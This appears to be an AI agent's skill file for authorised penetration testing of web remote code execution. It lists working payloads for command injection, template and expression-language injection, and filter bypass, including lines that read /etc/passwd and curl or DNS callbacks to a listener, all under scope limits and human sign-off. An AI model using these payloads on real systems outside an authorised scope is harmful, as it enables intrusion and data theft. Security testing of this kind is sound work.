---
name: web-rce
description: "Command injection and code-execution testing for a pentest-team engagement — OS command injection, SSTI-to-RCE, insecure deserialization, expression-language and file-upload chains, with per-engine payloads (Jinja2/Twig/Freemarker/Thymeleaf/ERB/SpEL/OGNL), blacklist/WAF bypass, and blind detection via time delay or an in-scope callback. Load it when the appsec-triage input-validation sweep turns up a command-injection or code-execution lead on a claimed web/API target."
---

# Remote Code Execution — under the engagement protocol

Deep methodology for the command-injection and code-execution class. You reach here from the `appsec-triage` input-validation sweep with a lead on a surface you already own on the board.

## Under the engagement protocol

- **Claimed and in-scope only.** Every probe runs against a target you own on the board and that is on the `ROE.md` allowlist — nothing else. RCE is the highest-blast-radius class here; the edge of the allowlist is the edge of everything.
- **Prove with a benign marker, never a destructive command.** Confirm with `whoami` / `id` / `hostname`, a fixed `sleep`, or a single planted proof file — never `rm`, `curl | bash`, a reverse shell, or anything that mutates the host. The point is *reachability of code execution*, not damage.
- **Callbacks go to a BENIGN in-scope listener only.** OOB/blind confirmation (DNS ping, HTTP beacon) fires to a listener inside the scope — never Burp Collaborator, `attacker.com`, or any live external pull. An OOB payload that leaves the app is proven against the in-scope listener and reported as reachability, never crossed.
- **Read before write; a confirmed shell is gated.** Once `whoami` returns you have proved the class — stop. Turning the primitive into an interactive shell, a written web shell, file writes, deserialization gadget detonation, or dependency/CVE exploitation is destructive/outward-facing: mark the surface blocked and route through the lead to the anchor for the human's explicit go before running it.
- **Rate-limit and coordinate load.** Time-based and OOB probes queue on the backend and a burst trips a WAF ban for the whole team. Throttle, keep the request count low, and coordinate on the board.
- **Log and file** per PROTOCOL §Evidence and §Findings — findings in the `appsec-reporting` format, with a reproduction another operator could re-run.

## Quick workflow

1. Map every input vector that could reach an interpreter or a shell: URL/body/header params, filenames, template fields, EL/search filters, serialized blobs, upload processing chains, webhook URLs.
2. Probe the likely context with a detection marker (arithmetic for templates, a shell separator for OS injection).
3. On no reflected result, fall back to blind: differential time delay, then an in-scope OOB callback.
4. Confirm with a benign command (`whoami`), capture the response, and stop — escalation to a shell is gated to the anchor.
5. File the finding with a clean reproduction and remediation.

## Detection — by context

### OS command injection
Separators, into every param/header/filename:
```
; whoami      | whoami      || whoami      & whoami      && whoami
`whoami`      $(whoami)
%0a whoami                                  # newline (also Windows)
```
Time-based when blind (keep the delay short, one request):
```
; sleep 5                | ping -c 5 127.0.0.1        # Linux
& timeout /t 5           | ping -n 5 127.0.0.1        # Windows
```
Differential latency (baseline vs payload) confirms without any output channel.

### SSTI → code execution
Fingerprint first with an arithmetic marker, then match the engine:
```
{{7*7}}  ${7*7}  <%= 7*7 %>  #{7*7}  [[${7*7}]]     # 49 => server-side eval
{{7*'7'}}                                            # 7777777 => Jinja2 (Python)
```
Escalation payloads — run the `whoami` form to prove, not to pivot:
```jinja
{{cycler.__init__.__globals__.os.popen('whoami').read()}}          # Jinja2
{{lipsum.__globals__['os'].popen('whoami').read()}}                # Jinja2 (alt)
{{['whoami']|filter('system')}}                                    # Twig / PHP
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}   # Freemarker
${T(java.lang.Runtime).getRuntime().exec('whoami')}                # Thymeleaf/SpEL
<%= `whoami` %>                                                    # ERB (Ruby)
```
`tplmap` / `SSTImap` automate detection — point them only at an in-scope host and throttle.

### Expression-language injection
SpEL/OGNL/MVEL in search filters and calculated fields:
```
${T(java.lang.Runtime).getRuntime().exec('whoami')}                # SpEL
${@java.lang.Runtime@getRuntime().exec('whoami')}                  # OGNL (Struts)
```
Blacklist-broken forms (`"java.l"+"ang.Ru"+"ntime"`, class-forName chains) bypass naive filters — note the bypass in the finding, it is reportable control-efficacy data.

### Insecure deserialization (detection only; detonation is gated)
Java/.NET/PHP/pickle/Ruby-Marshal sinks. Confirm the *shape* (a serialized blob is accepted and reflected in behaviour) and prove blind reachability with an in-scope OOB canary. Generating a live gadget chain (`ysoserial`, `ysoserial.net`, `marshalsec`) is RCE — route to the anchor before detonating.

### File-upload → processing chains
Upload parsers (ImageMagick/ImageTragick, ExifTool CVE-2021-22204, FFmpeg playlist SSRF, PDF/LaTeX `\write18`, XXE in DOCX/XLSX) can execute on ingest. Test with a *harmless* PoC that triggers an in-scope OOB callback; a written web shell or a real payload is gated.

## Blind confirmation (in-scope callback only)

```
; nslookup $(whoami).<in-scope-listener>          # DNS beacon, benign
; curl http://<in-scope-listener>/probe           # HTTP beacon, benign
```
The callback host is your assigned in-scope listener from the board — never an external collaborator. Exfil (`cat /etc/passwd | base64 | ...`) is a data pull: prove the channel with a marker string, do not exfiltrate real files.

## Bypass (when a filter or WAF sits in front)

Case (`WhOaMi`), encoding (`whoami`, hex, URL/double-URL), concatenation (`'wh'+'oami'`, `a=w;b=hoami;$a$b`), space alternatives (`cat</etc/passwd`, `{cat,/etc/passwd}`, `cat${IFS}/etc/passwd`), quote/backslash breaks (`c''at`, `c\at`), and Log4Shell-style nested lookups (`${${lower:j}ndi:...}`). Record what a WAF was present and what bypassed it — control efficacy is itself a finding.

## Escalation (gated — route through the anchor)

These cross from *reachability proven* into *host impact* and need the human's go: interactive/reverse shells, written web shells, SQLi→`OUTFILE`/`COPY TO PROGRAM`/`xp_cmdshell`, SSRF→internal-service RCE, path-traversal file overwrites (cron/`authorized_keys`/`.user.ini`), deserialization gadget detonation, and named-CVE exploitation (Log4Shell, Spring4Shell, Struts, Confluence). If the ROE forbids RCE or the target is production, a documented *proof of reachability* — you demonstrated the primitive exists via `whoami` or an in-scope callback — beats popping a shell.

## Remediation (for the finding)

1. **Fix** — never pass user input to `eval`/`exec`/`Runtime.exec`/`shell=True`; use parameterized, array-based execution (`shell=False`); disable user-supplied templates and enable engine sandbox mode; store uploads outside web root and re-encode/strip them.
2. **Defense in depth** — allowlist deserialization classes (avoid `pickle`/native graphs), sandbox file processing (seccomp/AppArmor, non-root, no egress), egress filtering to kill OOB callbacks, keep parsers patched (ImageMagick/ExifTool/FFmpeg/Log4j), least-privilege service account.
3. **Detection** — a log/SIEM/RASP rule on the injection signature (shell metacharacters, JNDI lookups, template markers) or the anomalous child-process spawn that would have caught it.

Write it up in the `appsec-reporting` finding format, CWE-77 / CWE-78 / CWE-94 / A03:2021 Injection, with the benign-marker reproduction.

## Related skills

- `web-ssti` — engine fingerprinting and the full per-engine template-injection payload matrix; this skill covers escalating SSTI (and command injection, deserialization) to RCE.
- `web-deserialization` — gadget-chain construction when the RCE vector is an unsafe deserializer.
